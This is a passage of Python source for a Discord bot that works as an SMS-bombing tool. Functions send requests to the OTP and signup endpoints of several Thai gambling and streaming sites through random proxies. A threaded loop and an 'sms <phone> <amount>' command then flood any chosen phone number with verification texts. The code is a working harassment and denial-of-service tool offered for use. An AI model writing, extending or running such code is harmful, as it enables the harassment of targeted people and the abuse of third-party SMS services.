def ASCII66(phone):
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "accept": "*/*",
	    "referer": "https://ufa108.ufabetcash.com/register.php",
	    "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
	    }
	post("https://ufa108.ufabetcash.com/api/",proxies ={"http" : "http://" + random.choice(proxy)},headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")

def ASCII67(phone):
    post("https://www.mrcash.top/h5/LoginMessage_ultimate",proxies ={"http" : "http://" + random.choice(proxy)},data = {"phone": phone,"type":"2","ctype":"1"})

def ASCII68(phone):
    post("https://www.monomax.me/api/v2/signup/telno",proxies ={"http" : "http://" + random.choice(proxy)},json ={"password":"12345678+","telno": phone})

def ASCII69(phone):
    post("https://m.pgwin168.com/api/register-otp",proxies ={"http" : "http://" + random.choice(proxy)},json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})

def ASCII70(phone):
    post("https://www.som777.com/api/otp/register",proxies ={"http" : "http://" + random.choice(proxy)},json ={"applicant": phone,"serviceName":"SOM777"})

def startall(phone, amount):
    for _ in range(int(amount)):
        threading.submit(ASCII1, phone)
        threading.submit(ASCII2, phone)
        threading.submit(ASCII3, phone)
        threading.submit(ASCII4, phone)
        threading.submit(ASCII5, phone)
        threading.submit(ASCII6, phone)
        threading.submit(ASCII7, phone)
        threading.submit(ASCII8, phone)
        threading.submit(ASCII9, phone)
        threading.submit(ASCII10, phone)
        threading.submit(ASCII11, phone)
        threading.submit(ASCII12, phone)
        threading.submit(ASCII13, phone)
        threading.submit(ASCII14, phone)
        threading.submit(ASCII15, phone)
        threading.submit(ASCII16, phone)
        threading.submit(ASCII17, phone)
        threading.submit(ASCII18, phone)
        threading.submit(ASCII19, phone)
        threading.submit(ASCII20, phone)
        threading.submit(ASCII21, phone)
        threading.submit(ASCII22, phone)
        threading.submit(ASCII23, phone)
        threading.submit(ASCII24, phone)
        threading.submit(ASCII25, phone)
        threading.submit(ASCII26, phone)
        threading.submit(ASCII27, phone)
        threading.submit(ASCII28, phone)
        threading.submit(ASCII29, phone)
        threading.submit(ASCII30, phone)
        threading.submit(ASCII31, phone)
        threading.submit(ASCII32, phone)
        threading.submit(ASCII33, phone)
        threading.submit(ASCII34, phone)
        threading.submit(ASCII35, phone)
        threading.submit(ASCII36, phone)
        threading.submit(ASCII37, phone)
        threading.submit(ASCII38, phone)
        threading.submit(ASCII39, phone)
        threading.submit(ASCII40, phone)
        threading.submit(ASCII41, phone)
        threading.submit(ASCII42, phone)
        threading.submit(ASCII43, phone)
        threading.submit(ASCII44, phone)
        threading.submit(ASCII45, phone)
        threading.submit(ASCII46, phone)
        threading.submit(ASCII47, phone)
        threading.submit(ASCII48, phone)
        threading.submit(ASCII49, phone)
        threading.submit(ASCII50, phone)
        threading.submit(ASCII52, phone)
        threading.submit(ASCII53, phone)
        threading.submit(ASCII54, phone)
        threading.submit(ASCII55, phone)
        threading.submit(ASCII56, phone)
        threading.submit(ASCII57, phone)
        threading.submit(ASCII58, phone)
        threading.submit(ASCII59, phone)
        threading.submit(ASCII60, phone)
        threading.submit(ASCII61, phone)
        threading.submit(ASCII62, phone)
        threading.submit(ASCII63, phone)
        threading.submit(ASCII64, phone)
        threading.submit(ASCII65, phone)
        threading.submit(ASCII66, phone)
        threading.submit(ASCII67, phone)
        threading.submit(ASCII68, phone)
        threading.submit(ASCII69, phone)
        threading.submit(ASCII70, phone)

@bot.event
async def on_connect():
    os.system("cls")
    print(f"     Login as : {bot.user.name}#{bot.user.discriminator}")
    print("     Bot Is now connected :D")
    getproxy()

bot.remove_command("help")
####

@bot.command()
async def help(ctx):
    if (str(ctx.message.channel.id) == f"{bot_room}"):
        embed = discord.Embed(title="คำสั่งยิงเบอร์", description=f"{Prefix}sms <เบอร์> <จำนวนไม่เกิน{Limit}>", color=0x00ff00)
        await ctx.reply(embed=embed)
    else:
        embed = discord.Embed(title="โปรดใช้งานคำสั่งในห้องที่กำหนดไว้", description=f"โปรดใช้งานในห้อง <#{bot_room}>", color=discord.Color.from_rgb(242, 2, 62))
        await ctx.reply(embed=embed, delete_after=10)

@bot.command()
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == f"{bot_room}"): 
        if (phone == None or amount == None):
            embed_unsuccess=discord.Embed(title="ยิงเบอร์ไม่สำเร็จ", description="``` กรุณาใส่ข้อมูลให้ครบถ้วน ```", color=discord.Color.from_rgb(242, 2, 62))
            embed_unsuccess.set_footer(text=f"| Bot By ASCII#1689 |", icon_url=ctx.author.avatar_url)
            embed_unsuccess.set_image(url='https://media1.giphy.com/media/ykaNntbZ3hfsWotKmA/giphy.gif')
            await ctx.reply(embed=embed_unsuccess, content=None, delete_after=5) 
            await ctx.message.delete()  
        else:
            if (str(amount) > Limit):
                embed_unsuccess_limit=discord.Embed(title="ยิงเบอร์ไม่สำเร็จ", description=f"```สามารถยิงได้รอบละ {Limit} ครั้ง เท่านั้น!```", color=discord.Color.from_rgb(242, 2, 62))
                embed_unsuccess_limit.set_footer(text=f"| Bot By ASCII#1689 |", icon_url=ctx.author.avatar_url)
                embed_unsuccess_limit.set_image(url='https://media1.giphy.com/media/ykaNntbZ3hfsWotKmA/giphy.gif')
                await ctx.reply(embed=embed_unsuccess_limit, content=None, delete_after=5)
                await ctx.message.delete()
            else:
                embed_success=discord.Embed(title="ยิงเบอร์สำเร็จ !!", color=discord.Color.from_rgb(31, 240, 62),)
                embed_success.set_footer(text=f"| Bot By ASCII#1689 |")
                embed_success.set_thumbnail(url='https://i.gifer.com/7efs.gif')
                embed_success.add_field(name="กำลังยิงไปที่เบอร์", value=f"``` {phone} ```")
                embed_success.add_field(name="จำนวน", value=f"``` {amount} ```")
                embed_success.set_image(url='https://64.media.tumblr.com/d23102c37a621eb1ae8875c2ef8a7d00/tumblr_nzcjk5Wv0t1u9ia8fo1_500.gif')
                await ctx.reply(embed=embed_success)
                startall(phone, amount)    
    else:
        embed_wrong_channel=discord.Embed(title="ยิงเบอร์ไม่สำเร็จ", description=f"``` โปรดใช้คำสั่งในห้องที่กำหนดไว้ด้วยค่ะ ```", color=discord.Color.from_rgb(242, 2, 62))
        embed_wrong_channel.set_footer(text=f"| Bot By ASCII#1689 |", icon_url=ctx.author.avatar_url)
        embed_wrong_channel.set_author(name='SMS flood command [th]')
        embed_wrong_channel.set_thumbnail(url='https://media.discordapp.net/attachments/680449178626818065/909437371097972747/794404253744496642.gif')
        await ctx.reply(embed=embed_wrong_channel, content=None, delete_after=5)
        await ctx.message.delete()
        
bot.run(Token, reconnect=True)
